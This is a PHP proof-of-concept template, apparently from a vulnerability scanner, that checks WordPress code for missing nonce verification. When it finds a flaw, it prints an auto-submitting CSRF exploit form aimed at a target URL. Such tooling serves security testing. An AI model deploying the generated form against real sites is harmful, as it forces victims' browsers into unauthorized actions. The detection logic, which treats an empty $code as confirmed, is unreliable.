<?php
/**
 * PoC Template: Cross-Site Request Forgery (CSRF)
 * Auto-generated from ZeroKit finding
 * 
 * Vulnerability: {{CATEGORY}}
 * Location: {{FILE}}:{{LINE}}
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);

echo "====================================\n";
echo "🎯 PoC: Cross-Site Request Forgery (CSRF)\n";
echo "Location: {{FILE}}:{{LINE}}\n";
echo "====================================\n\n";

// =====================================================
// EXPLOIT SCENARIO
// =====================================================
echo "[*] Testing CSRF vulnerability\n";
echo "[*] Checking for nonce verification...\n";

// =====================================================
// VULNERABLE CODE EXECUTION
// =====================================================
// Template manager will replace this section with actual vulnerable code
$output = '';
$code = '';
ob_start();
// VULNERABLE_CODE_PLACEHOLDER
$output = ob_get_clean();

// =====================================================
// VERIFICATION
// =====================================================
$success = false;

// Check if action was executed without nonce verification
if (stripos($code, 'wp_verify_nonce') === false && 
    stripos($code, 'check_admin_referer') === false &&
    stripos($code, 'wp_nonce_field') === false) {
    
    echo "✅ VULNERABILITY CONFIRMED: No nonce verification found\n";
    $success = true;
}

// Check if sensitive action exists (delete, update, admin actions)
if (preg_match('/(delete|update|insert|admin|settings)/i', $code)) {
    echo "⚠️  Action performs sensitive operation without CSRF protection\n";
    $success = true;
}

// Check for direct $_GET/$_POST usage in admin actions
if (preg_match('/\$_(GET|POST|REQUEST)\[/', $code)) {
    echo "⚠️  Direct user input access detected\n";
}

// Verify action was actually executed
if (!empty($output) && stripos($output, 'error') === false) {
    echo "✅ VULNERABILITY CONFIRMED: Action executed without authentication\n";
    $success = true;
}

// =====================================================
// EXPLOIT TEMPLATE
// =====================================================
if ($success) {
    echo "\n[*] Generating CSRF exploit HTML...\n";
    echo "\n<!-- CSRF Exploit -->\n";
    echo "<html>\n";
    echo "<body>\n";
    echo "<form action=\"{{TARGET_URL}}\" method=\"POST\" id=\"csrf_form\">\n";
    echo "  <input type=\"hidden\" name=\"action\" value=\"{{ACTION}}\" />\n";
    echo "  <!-- Add other parameters here -->\n";
    echo "</form>\n";
    echo "<script>document.getElementById('csrf_form').submit();</script>\n";
    echo "</body>\n";
    echo "</html>\n";
}

// =====================================================
// RESULT
// =====================================================
echo "\n====================================\n";
if ($success) {
    echo "🚨 RESULT: EXPLOITABLE (CSRF)\n";
    echo "Severity: {{SEVERITY}}\n";
    echo "Impact: Unauthorized actions, privilege escalation, data manipulation\n";
    echo "\nRecommendation: Add wp_verify_nonce() or check_admin_referer()\n";
    exit(0);
} else {
    echo "❌ RESULT: NOT EXPLOITABLE\n";
    echo "CSRF protection present (nonce verification found)\n";
    exit(1);
}
